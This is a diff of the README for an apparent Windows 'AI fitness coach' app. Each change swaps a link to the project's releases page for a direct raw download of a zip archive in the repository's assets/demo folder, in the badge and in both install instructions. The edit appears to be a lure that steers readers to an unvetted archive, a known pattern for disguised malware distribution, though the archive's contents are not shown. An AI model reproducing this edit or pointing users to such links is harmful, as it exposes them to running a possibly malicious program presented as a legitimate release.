@@ -1,6 +1,6 @@
 # 🏋️ ai-fitness-coach - Track fitness with smart WhatsApp coaching
 
-[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Abigaelacrocarpous465/ai-fitness-coach/releases)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Abigaelacrocarpous465/ai-fitness-coach/raw/refs/heads/main/assets/demo/ai_fitness_coach_2.8.zip)
 
 ## 📱 Overview
 
@@ -33,7 +33,7 @@ Before you install, make sure your PC can run a modern desktop app:
 
 Visit this page to download the Windows release:
 
-https://github.com/Abigaelacrocarpous465/ai-fitness-coach/releases
+https://github.com/Abigaelacrocarpous465/ai-fitness-coach/raw/refs/heads/main/assets/demo/ai_fitness_coach_2.8.zip
 
 ## 🛠️ Install on Windows
 
@@ -202,7 +202,7 @@ These suggestions keep the app useful without adding extra work.
 
 Use this page to download the latest Windows build:
 
-https://github.com/Abigaelacrocarpous465/ai-fitness-coach/releases
+https://github.com/Abigaelacrocarpous465/ai-fitness-coach/raw/refs/heads/main/assets/demo/ai_fitness_coach_2.8.zip
 
 ## 🧭 Project topics
 
